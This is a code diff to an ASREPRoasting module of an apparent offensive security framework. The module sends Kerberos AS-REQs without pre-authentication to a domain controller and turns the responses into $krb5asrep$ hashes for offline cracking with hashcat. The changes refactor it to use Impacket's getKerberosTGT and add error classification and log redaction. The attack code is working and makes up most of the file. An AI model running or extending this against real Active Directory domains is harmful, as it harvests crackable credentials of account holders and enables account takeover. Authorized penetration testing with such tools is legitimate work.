@@ -1,5 +1,6 @@
 from __future__ import annotations
 import asyncio
+import re
 """
 ASREPRoasting — impacket.krb5.kerberosv5 low-level API (impacket >=0.11 compatible)
 MITRE: T1558.004 — Works fully unauthenticated with username list.
@@ -34,51 +35,39 @@ from ares.modules.ad.dependencies import (
 
 def _capture_asrep_raw(dc: str, domain: str, username: str) -> bytes | None:
     """
-    Issue #4 fix: Send AS-REQ without pre-auth via raw sendReceive and return
-    the raw wire bytes of the AS-REP.
+    Request an AS-REP without pre-auth through Impacket's supported Kerberos
+    API and return its raw wire bytes.
 
-    getKerberosTGT() parses the AS-REP internally so its return value cannot be
-    used for hash extraction. sendReceive() gives us the raw bytes that
-    _format_krb5asrep_hash() can parse into $krb5asrep$ format.
+    ``kerberoast_no_preauth=True`` makes getKerberosTGT return the raw AS-REP
+    when the KDC omits pre-auth, even though ARES has no password with which
+    to decrypt the ticket. This keeps request construction aligned with
+    Impacket's KDC-compatible options and preserves the bytes needed by
+    _format_krb5asrep_hash().
 
     Returns raw AS-REP bytes if account is ASREPRoastable, None otherwise.
     """
     try:
-        from impacket.krb5.asn1 import AS_REQ, seq_set
         from impacket.krb5 import constants
-        from impacket.krb5.types import Principal, KerberosTime
-        from impacket.krb5.kerberosv5 import sendReceive
-        from pyasn1.codec.ber import encoder
-        from pyasn1.type.univ import noValue
-        import datetime, os
+        from impacket.krb5.kerberosv5 import getKerberosTGT
+        from impacket.krb5.types import Principal
 
-        client = Principal(username,
-                           type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        krb_as_req = AS_REQ()
-
-        req_body = krb_as_req["req-body"]
-        req_body["kdc-options"] = constants.encodeFlags([])
-        seq_set(req_body, "cname", client.components_to_asn1)
-        req_body["realm"] = domain.upper()
-
-        server_name = Principal(
-            f"krbtgt/{domain.upper()}",
-            type=constants.PrincipalNameType.NT_SRV_INST.value,
+        client = Principal(
+            username,
+            type=constants.PrincipalNameType.NT_PRINCIPAL.value,
         )
-        seq_set(req_body, "sname", server_name.components_to_asn1)
-
-        now = datetime.datetime.now(datetime.timezone.utc)
-        req_body["from"]  = KerberosTime.to_asn1(now)
-        req_body["till"]  = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
-        req_body["rtime"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
-        req_body["nonce"] = int.from_bytes(os.urandom(4), "big")
-        req_body["etype"][0] = constants.EncryptionTypes.rc4_hmac.value   # RC4 = fastest crack
-
-        krb_as_req["pvno"]     = 5
-        krb_as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
         # No padata — no pre-auth. If account has DONT_REQUIRE_PREAUTH, KDC responds with AS-REP.
 
-        raw_rep = sendReceive(encoder.encode(krb_as_req), domain.upper(), dc)
+        raw_rep, _cipher, _key, _session_key = getKerberosTGT(
+            client,
+            "",
+            domain,
+            b"",
+            b"",
+            aesKey=b"",
+            kdcHost=dc,
+            requestPAC=True,
+            kerberoast_no_preauth=True,
+        )
         return raw_rep
 
     except Exception as exc:
@@ -90,6 +79,10 @@ def _capture_asrep_raw(dc: str, domain: str, username: str) -> bytes | None:
         if "KDC_ERR_CLIENT_REVOKED" in msg or "CLIENT_REVOKED" in msg:
             return None   # account disabled
         raise
+
+
+class ASREPParseError(ValueError):
+    """The KDC response was not a supported AS-REP wire message."""
 
 
 def _format_krb5asrep_hash(raw_asrep: bytes, username: str, domain: str) -> str:
@@ -111,7 +104,9 @@ def _format_krb5asrep_hash(raw_asrep: bytes, username: str, domain: str) -> str:
         cipher   = bytes(enc["cipher"])
 
         if len(cipher) < 16:
-            return ""
+            raise ASREPParseError(
+                "AS-REP response could not be parsed (InvalidASREPResponse)"
+            )
 
         checksum   = cipher[:16].hex()
         ciphertext = cipher[16:].hex()
@@ -119,20 +114,35 @@ def _format_krb5asrep_hash(raw_asrep: bytes, username: str, domain: str) -> str:
             f"$krb5asrep${etype}${username}@{domain.upper()}"
             f":{checksum}${ciphertext}"
         )
-    except Exception:
-        return ""
+    except Exception as exc:
+        raise ASREPParseError(
+            f"AS-REP response could not be parsed ({type(exc).__name__})"
+        ) from exc
 
 
 def classify_asrep_outcome(
-    mode: str, candidate_count: int, hash_count: int
+    mode: str,
+    candidate_count: int,
+    hash_count: int,
+    failure_category: str = "",
+    failure_reason: str = "",
 ) -> tuple[str, str]:
     """Explain an AS-REP run that did not produce a confirmed finding."""
     if hash_count:
         return "confirmed_findings", f"Captured {hash_count} AS-REP roastable result(s)."
     if candidate_count:
+        category = failure_category or "operator_error"
+        reason = failure_reason or "AS-REP material was not returned"
         return (
-            "completed_no_findings",
-            f"LDAP found {candidate_count} candidate account(s), but no AS-REP roast material was obtained; the condition was not confirmed.",
+            category,
+            (
+                f"LDAP found {candidate_count} ASREPRoast candidate account(s), but "
+                "Kerberos did not return AS-REP material. "
+                f"Last Kerberos error: {reason}. "
+                "Next steps: verify DoesNotRequirePreAuth on the account, KDC/port "
+                "88, clock sync, account enabled/unlocked, and domain/realm correctness, "
+                "then rerun."
+            ),
         )
     if mode == "authenticated":
         return (
@@ -143,6 +153,47 @@ def classify_asrep_outcome(
         "completed_no_findings",
         "The username input completed without AS-REP roast material; no condition was confirmed.",
     )
+
+
+def _sanitize_asrep_failure_reason(value: Any) -> str:
+    """Keep operator-facing AS-REP failure context bounded and secret-free."""
+    text = " ".join(str(value).split())[:160]
+    text = re.sub(
+        r"(?i)\b(password|passwd|secret|token|api[_-]?key|nt_hash|lm_hash|krbtgt_hash)\b\s*([:=])\s*[^\s,;]+",
+        r"\1\2[redacted]",
+        text,
+    )
+    text = re.sub(r"(?i)\$krb5(?:asrep|tgs)\$[^\s]+", "[hash redacted]", text)
+    return text or "AS-REP request failed without a reason"
+
+
+def classify_asrep_request_error(exc: BaseException) -> tuple[str, str]:
+    """Classify known Kerberos request failures without exposing raw details."""
+    text = str(exc)
+    lowered = text.lower()
+    if "krb_ap_err_skew" in lowered or "clock skew too great" in lowered:
+        return "operator_error", "KRB_AP_ERR_SKEW: Kerberos clock skew too great"
+    if "kdc_err_wrong_realm" in lowered or "wrong realm" in lowered:
+        return "operator_error", "KDC_ERR_WRONG_REALM: Kerberos realm mismatch"
+    if "kdc_err_cannot_postdate" in lowered:
+        return "operator_error", "KDC_ERR_CANNOT_POSTDATE: ticket not eligible for postdating"
+    if any(marker in lowered for marker in (
+        "invalid credentials",
+        "logon failure",
+        "kdc_err_preauth_failed",
+        "authentication failed",
+    )):
+        return "operator_error", "invalid credentials"
+    if any(marker in lowered for marker in (
+        "timed out",
+        "timeout",
+        "connection refused",
+        "unreachable",
+        "no route to host",
+        "network",
+    )):
+        return "network_error", _sanitize_asrep_failure_reason(exc)
+    return "module_error", _sanitize_asrep_failure_reason(exc)
 
 
 class ASREPRoastModule(BaseModule):
@@ -253,6 +304,8 @@ class ASREPRoastModule(BaseModule):
         logger.info("asreproast_start", dc=dc, domain=domain, mode=mode)
 
         self._last_candidate_count = 0
+        self._last_hash_failure_category = ""
+        self._last_hash_failure_reason = ""
         try:
             hashes, accounts = await self._get_asrep_hashes(
                 dc, domain, username, password, userfile, usernames or [], mode
@@ -270,10 +323,25 @@ class ASREPRoastModule(BaseModule):
         }
         if not hashes:
             category, message = classify_asrep_outcome(
-                mode, self._last_candidate_count, len(hashes)
+                mode,
+                self._last_candidate_count,
+                len(hashes),
+                self._last_hash_failure_category,
+                self._last_hash_failure_reason,
             )
             raw["outcome_category"] = category
             raw["outcome_message"] = message
+            raw["candidate_count"] = self._last_candidate_count
+            if self._last_hash_failure_reason:
+                raw["asrep_failure_category"] = self._last_hash_failure_category
+                raw["asrep_failure_reason"] = self._last_hash_failure_reason
+            if self._last_candidate_count:
+                logger.warning(
+                    "asreproast_candidates_no_hash",
+                    candidates=self._last_candidate_count,
+                    reason=self._last_hash_failure_reason
+                    or "AS-REP material was not returned",
+                )
         self._analyze(raw)
         return self._findings, raw
 
@@ -331,20 +399,66 @@ class ASREPRoastModule(BaseModule):
                 a parsed TGT object, not raw AS-REP bytes. _format_krb5asrep_hash()
                 needs raw bytes to extract enc-part for hashcat.
                 """
+                logger.info("asreproast_hash_request_start", username=u[:120])
                 try:
-                    return _capture_asrep_raw(dc, domain, u)
+                    raw_result = _capture_asrep_raw(dc, domain, u)
                 except Exception as exc:
-                    logger.debug("asreproast_request_error",
-                                 username=u, error=str(exc)[:80])
-                    return None
+                    category, reason = classify_asrep_request_error(exc)
+                    logger.warning(
+                        "asreproast_hash_request_failed",
+                        username=u[:120],
+                        reason=reason,
+                    )
+                    return None, category, reason
+                if raw_result is None:
+                    reason = "AS-REP material was not returned"
+                    logger.warning(
+                        "asreproast_hash_request_failed",
+                        username=u[:120],
+                        reason=reason,
+                    )
+                    return None, "operator_error", reason
+                return raw_result, "", ""
 
-            raw_asrep = await loop.run_in_executor(None, _try_asreq)
+            raw_asrep, failure_category, failure_reason = await loop.run_in_executor(
+                None, _try_asreq
+            )
             if raw_asrep is not None:
-                hash_str = _format_krb5asrep_hash(raw_asrep, uname, domain)
-                if hash_str:
-                    hashes.append(hash_str)
-                    accounts.append(uname)
-                    logger.info("asreproast_hash_captured", username=uname)
+                try:
+                    hash_str = _format_krb5asrep_hash(raw_asrep, uname, domain)
+                except ASREPParseError as exc:
+                    failure_category = "module_error"
+                    failure_reason = (
+                        f"{exc}; candidate={uname[:120]}; "
+                        "response was malformed or unsupported"
+                    )
+                    logger.warning(
+                        "asreproast_hash_request_failed",
+                        username=uname[:120],
+                        reason=failure_reason,
+                    )
+                else:
+                    if hash_str:
+                        hashes.append(hash_str)
+                        accounts.append(uname)
+                        logger.info("asreproast_hash_captured", username=uname)
+                    else:
+                        failure_category = "module_error"
+                        failure_reason = (
+                            f"AS-REP response could not be parsed; candidate={uname[:120]}; "
+                            "response was malformed or unsupported"
+                        )
+                        logger.warning(
+                            "asreproast_hash_request_failed",
+                            username=uname[:120],
+                            reason=failure_reason,
+                        )
+
+            if failure_reason:
+                self._last_hash_failure_category = failure_category
+                self._last_hash_failure_reason = _sanitize_asrep_failure_reason(
+                    failure_reason
+                )
 
             # per-request jitter
             if i < len(targets) - 1:
